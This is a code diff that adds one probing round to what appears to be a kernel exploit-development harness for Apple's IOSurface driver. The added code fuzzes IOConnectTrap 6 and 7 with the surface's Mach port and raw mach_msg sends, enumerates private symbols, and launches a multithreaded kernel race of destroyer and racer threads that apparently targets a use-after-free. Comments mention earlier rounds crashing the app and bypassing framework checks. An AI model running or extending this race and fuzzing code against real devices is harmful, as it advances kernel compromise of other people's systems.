@@ -1742,6 +1742,271 @@ static volatile int r264_probed = 0;
  * Operations must go through traps, shared memory, or different client types. */
 static volatile int r265_probed = 0;
 
+/* r268: Targeted trap 6/7 with surfMachPort as first arg + safe mach_msg probe.
+ * r266 showed trap returns BadArgument when surfMachPort is first arg (proving
+ * the trap validates it as an IOSurface port), IPCError for all other ports.
+ * r267 showed mach_msg to the port crashes/kills the app.
+ * This round: exhaustive trap 6/7 arg sweep with surfMachPort at arg[0],
+ * plus careful mach_msg with fflush after each attempt. */
+static volatile int r268_probed = 0;
+
+static void r268_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+    kern_return_t kr;
+
+    rlog("\n=== r268: Trap 6/7 with surfMachPort as first arg ===\n");
+    fflush(stdout);
+
+    mach_port_t sp = IOSurfaceCreateMachPort(surf);
+    rlog("  surfMachPort=%u surfID=%u\n", sp, sid);
+    fflush(stdout);
+
+    /* Create notification port */
+    mach_port_t np = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &np);
+    mach_port_insert_right(mach_task_self(), np, np, MACH_MSG_TYPE_MAKE_SEND);
+
+    /* Open IOSurfaceRoot connection */
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = IO_OBJECT_NULL;
+    IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    rlog("  conn=%u\n", conn);
+    fflush(stdout);
+
+    /* Load all trap functions */
+    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+    typedef kern_return_t (*trap0_t)(io_connect_t, uint32_t);
+    typedef kern_return_t (*trap1_t)(io_connect_t, uint32_t, uintptr_t);
+    typedef kern_return_t (*trap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap3_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap4_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap5_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+    typedef kern_return_t (*trap6_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t,
+        uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+
+    trap1_t t1 = (trap1_t)dlsym(iokit, "IOConnectTrap1");
+    trap2_t t2 = (trap2_t)dlsym(iokit, "IOConnectTrap2");
+    trap3_t t3 = (trap3_t)dlsym(iokit, "IOConnectTrap3");
+    trap4_t t4 = (trap4_t)dlsym(iokit, "IOConnectTrap4");
+    trap5_t t5 = (trap5_t)dlsym(iokit, "IOConnectTrap5");
+    trap6_t t6 = (trap6_t)dlsym(iokit, "IOConnectTrap6");
+
+    /* ========== Trap idx=6 with surfMachPort as FIRST arg ========== */
+    rlog("\n  --- Trap 6: surfMachPort as first arg ---\n"); fflush(stdout);
+
+    /* T1: just the port */
+    kr = t1(conn, 6, (uintptr_t)sp);
+    rlog("    T1(6, sp): 0x%x\n", kr); fflush(stdout);
+
+    /* T2: port + various second args */
+    kr = t2(conn, 6, (uintptr_t)sp, 0); rlog("    T2(6, sp, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 6, (uintptr_t)sp, 1); rlog("    T2(6, sp, 1): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 6, (uintptr_t)sp, sid); rlog("    T2(6, sp, sID): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(6, sp, np): 0x%x\n", kr); fflush(stdout);
+
+    /* T3: port + two more args */
+    kr = t3(conn, 6, (uintptr_t)sp, 0, 0); rlog("    T3(6, sp, 0, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 6, (uintptr_t)sp, sid, 0); rlog("    T3(6, sp, sID, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 6, (uintptr_t)sp, 0, sid); rlog("    T3(6, sp, 0, sID): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 6, (uintptr_t)sp, 1, 0); rlog("    T3(6, sp, 1, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(6, sp, np, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid); rlog("    T3(6, sp, np, sID): 0x%x\n", kr); fflush(stdout);
+
+    /* T4: port + three more */
+    kr = t4(conn, 6, (uintptr_t)sp, 0, 0, 0); rlog("    T4(6, sp, 0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 6, (uintptr_t)sp, sid, 0, 0); rlog("    T4(6, sp, sID,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0, 0); rlog("    T4(6, sp, np,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0); rlog("    T4(6, sp, np,sID,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0); rlog("    T4(6, sp, sID,np,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 6, (uintptr_t)sp, 1, (uintptr_t)np, 0); rlog("    T4(6, sp, 1,np,0): 0x%x\n", kr); fflush(stdout);
+
+    /* T5: port + four more */
+    kr = t5(conn, 6, (uintptr_t)sp, 0, 0, 0, 0); rlog("    T5(6, sp, 0,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t5(conn, 6, (uintptr_t)sp, sid, 0, 0, 0); rlog("    T5(6, sp, sID,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t5(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0, 0); rlog("    T5(6, sp, np,sID,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t5(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0, 0); rlog("    T5(6, sp, sID,np,0,0): 0x%x\n", kr); fflush(stdout);
+
+    /* T6: port + five more */
+    kr = t6(conn, 6, (uintptr_t)sp, 0, 0, 0, 0, 0); rlog("    T6(6, sp, 0,0,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t6(conn, 6, (uintptr_t)sp, sid, 0, 0, 0, 0); rlog("    T6(6, sp, sID,0,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t6(conn, 6, (uintptr_t)sp, (uintptr_t)np, 0, 0, 0, 0); rlog("    T6(6, sp, np,0,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t6(conn, 6, (uintptr_t)sp, (uintptr_t)np, sid, 0, 0, 0); rlog("    T6(6, sp, np,sID,0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t6(conn, 6, (uintptr_t)sp, sid, (uintptr_t)np, 0, 0, 0); rlog("    T6(6, sp, sID,np,0,0,0): 0x%x\n", kr); fflush(stdout);
+
+    /* Try with notification type values 0-3 as second arg */
+    rlog("\n  --- Trap 6: sp + notify_type sweep ---\n"); fflush(stdout);
+    for (int nt = 0; nt <= 7; nt++) {
+        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)nt);
+        rlog("    T2(6, sp, %d): 0x%x\n", nt, kr); fflush(stdout);
+    }
+
+    /* Try with memory address as arg (surface base address) */
+    IOSurfaceLock(surf, 0, NULL);
+    void *base = IOSurfaceGetBaseAddress(surf);
+    IOSurfaceUnlock(surf, 0, NULL);
+    if (base) {
+        rlog("\n  --- Trap 6: sp + base address ---\n"); fflush(stdout);
+        kr = t2(conn, 6, (uintptr_t)sp, (uintptr_t)base);
+        rlog("    T2(6, sp, base): 0x%x\n", kr); fflush(stdout);
+        kr = t3(conn, 6, (uintptr_t)sp, (uintptr_t)base, 4096);
+        rlog("    T3(6, sp, base, 4096): 0x%x\n", kr); fflush(stdout);
+    }
+
+    /* ========== Trap idx=7 with surfMachPort as FIRST arg ========== */
+    rlog("\n  --- Trap 7: surfMachPort as first arg ---\n"); fflush(stdout);
+
+    kr = t1(conn, 7, (uintptr_t)sp);
+    rlog("    T1(7, sp): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 7, (uintptr_t)sp, 0); rlog("    T2(7, sp, 0): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 7, (uintptr_t)sp, 1); rlog("    T2(7, sp, 1): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 7, (uintptr_t)sp, sid); rlog("    T2(7, sp, sID): 0x%x\n", kr); fflush(stdout);
+    kr = t2(conn, 7, (uintptr_t)sp, (uintptr_t)np); rlog("    T2(7, sp, np): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 7, (uintptr_t)sp, 0, 0); rlog("    T3(7, sp, 0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 7, (uintptr_t)sp, sid, 0); rlog("    T3(7, sp, sID,0): 0x%x\n", kr); fflush(stdout);
+    kr = t3(conn, 7, (uintptr_t)sp, (uintptr_t)np, 0); rlog("    T3(7, sp, np,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 7, (uintptr_t)sp, 0, 0, 0); rlog("    T4(7, sp, 0,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 7, (uintptr_t)sp, sid, 0, 0); rlog("    T4(7, sp, sID,0,0): 0x%x\n", kr); fflush(stdout);
+    kr = t4(conn, 7, (uintptr_t)sp, (uintptr_t)np, sid, 0); rlog("    T4(7, sp, np,sID,0): 0x%x\n", kr); fflush(stdout);
+
+    /* ========== Try different trap indices with surfMachPort ========== */
+    rlog("\n  --- Other trap indices with sp ---\n"); fflush(stdout);
+    for (int idx = 0; idx <= 10; idx++) {
+        if (idx == 6 || idx == 7) continue;
+        kr = t1(conn, idx, (uintptr_t)sp);
+        rlog("    T1(%d, sp): 0x%x\n", idx, kr); fflush(stdout);
+    }
+
+    /* ========== Part 2: Safe mach_msg probe with fflush ========== */
+    rlog("\n=== r268 Part 2: Safe mach_msg to IOSurface port ===\n"); fflush(stdout);
+    {
+        /* Only send, no receive - avoid blocking */
+        struct {
+            mach_msg_header_t hdr;
+        } msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = sp;
+        msg.hdr.msgh_local_port = MACH_PORT_NULL;
+        msg.hdr.msgh_id = 0;
+
+        rlog("  Sending minimal msg (no reply) to port %u...\n", sp); fflush(stdout);
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
+            MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        rlog("  mach_msg(id=0, no_reply): kr=0x%x\n", kr); fflush(stdout);
+
+        /* Try a few more IDs if the first worked */
+        for (int mid = 1; mid <= 5; mid++) {
+            msg.hdr.msgh_id = mid;
+            msg.hdr.msgh_remote_port = sp;
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+            msg.hdr.msgh_size = sizeof(msg);
+            kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0,
+                MACH_PORT_NULL, 50, MACH_PORT_NULL);
+            rlog("  mach_msg(id=%d, no_reply): kr=0x%x\n", mid, kr); fflush(stdout);
+        }
+    }
+
+    /* Part 3: Private symbol probe */
+    rlog("\n=== r268 Part 3: Private IOSurface symbols ===\n"); fflush(stdout);
+    {
+        void *iosfc = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+        if (iosfc) {
+            const char *syms[] = {
+                "IOSurfaceCopyAllValues", "IOSurfaceRemoveAllValues",
+                "IOSurfaceClientCreate", "IOSurfaceClientRelease",
+                "IOSurfaceClientLookup", "IOSurfaceClientLock",
+                "IOSurfaceSendRight", "IOSurfacePortForID",
+                "_IOSurfaceNotifyValues", "_IOSurfaceSetNotify",
+                "_IOSurfaceRemoveNotify", "_IOSurfaceSendMessage",
+                "_IOSurfaceGetMachPort", "_IOSurfaceXPCSetValue",
+                "IOSurfacePropertyModify", "IOSurfacePropertyListModify",
+                NULL
+            };
+            for (int i = 0; syms[i]; i++) {
+                void *p = dlsym(iosfc, syms[i]);
+                if (p) rlog("  FOUND: %s = %p\n", syms[i], p);
+            }
+            fflush(stdout);
+            dlclose(iosfc);
+        }
+        /* Also check IOKit for Trap3-5 */
+        void *iokitfw = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+        if (iokitfw) {
+            const char *iokit_syms[] = {
+                "IOConnectTrap3", "IOConnectTrap4", "IOConnectTrap5",
+                "IOConnectAddClient", "io_connect_method",
+                NULL
+            };
+            for (int i = 0; iokit_syms[i]; i++) {
+                void *p = dlsym(iokitfw, iokit_syms[i]);
+                if (p) rlog("  IOKit: %s = %p\n", iokit_syms[i], p);
+            }
+            fflush(stdout);
+            dlclose(iokitfw);
+        }
+    }
+
+    /* Part 4: Short kernel race (5 seconds to avoid Jetsam) */
+    rlog("\n=== r268 Part 4: Kernel race (5s) ===\n"); fflush(stdout);
+    {
+        int w2 = 32, h2 = 32, bpe2 = 4, bpr2 = w2 * bpe2, pf2 = 0x42475241, as2 = bpr2 * h2;
+        CFMutableDictionaryRef rprops = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef rw = CFNumberCreate(NULL, kCFNumberIntType, &w2);
+        CFNumberRef rh = CFNumberCreate(NULL, kCFNumberIntType, &h2);
+        CFNumberRef rb = CFNumberCreate(NULL, kCFNumberIntType, &bpe2);
+        CFNumberRef rr = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
+        CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf2);
+        CFNumberRef ras = CFNumberCreate(NULL, kCFNumberIntType, &as2);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfaceWidth"), rw);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfaceHeight"), rh);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerElement"), rb);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfaceBytesPerRow"), rr);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfacePixelFormat"), rpf);
+        CFDictionarySetValue(rprops, CFSTR("IOSurfaceAllocSize"), ras);
+        CFRelease(rw); CFRelease(rh); CFRelease(rb); CFRelease(rr); CFRelease(rpf); CFRelease(ras);
+
+        memset((void*)r267_last_ids, 0, sizeof(r267_last_ids));
+        r267_race_stop = 0;
+        r267_id_head = 0;
+        r267_lock_ok = r267_lock_fail = r267_purg_ok = r267_purg_fail = 0;
+        r267_tex_ok = r267_tex_fail = 0;
+
+        pthread_t threads[8];
+        int tc = 0;
+        pthread_create(&threads[tc++], NULL, r267_destroyer_fn, rprops);
+        pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
+        pthread_create(&threads[tc++], NULL, r267_id_tracker_fn, rprops);
+        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
+        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)0);
+        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
+        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)1);
+        pthread_create(&threads[tc++], NULL, r267_kernel_racer_fn, (void*)2);
+
+        sleep(5);
+        r267_race_stop = 1;
+        for (int i = 0; i < tc; i++) pthread_join(threads[i], NULL);
+
+        rlog("  Lock: ok=%llu fail=%llu\n", r267_lock_ok, r267_lock_fail);
+        rlog("  Purgeable: ok=%llu fail=%llu\n", r267_purg_ok, r267_purg_fail);
+        rlog("  UseCount+SetValue: ok=%llu fail=%llu\n", r267_tex_ok, r267_tex_fail);
+        fflush(stdout);
+
+        CFRelease(rprops);
+    }
+
+    if (iokit) dlclose(iokit);
+    IOServiceClose(conn);
+    IOObjectRelease(svc);
+    mach_port_deallocate(mach_task_self(), sp);
+    mach_port_deallocate(mach_task_self(), np);
+    __sync_fetch_and_add(&r268_probed, 1);
+    fflush(stdout);
+}
+
 /* r267: Direct Mach messaging to IOSurface port + port enumeration + targeted race.
  * r266 showed trap 6/7 return differently when given the IOSurface Mach port
  * (BadArgument instead of IPCError). The framework must use Mach IPC to bypass
@@ -21953,6 +22218,41 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 268) {
+            rlog("*** rounds=268: Targeted trap 6/7 with surfMachPort + safe mach_msg ***\n");
+            rlog("  surfMachPort as FIRST arg to traps — exhaustive arg sweep\n\n");
+            fflush(stdout);
+
+            int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+            int alloc_sz = bpr * h;
+            CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+            CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+            CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+
+            IOSurfaceRef surf = IOSurfaceCreate(props);
+            rlog("  surf=%p id=%u\n", surf, surf ? IOSurfaceGetID(surf) : 0);
+            fflush(stdout);
+            if (surf) {
+                r268_probe(surf);
+                CFRelease(surf);
+            }
+            CFRelease(props);
+            rlog("\n*** r268 complete ***\n");
+            fflush(stdout);
             goto done;
         }
         if (rounds == 267) {
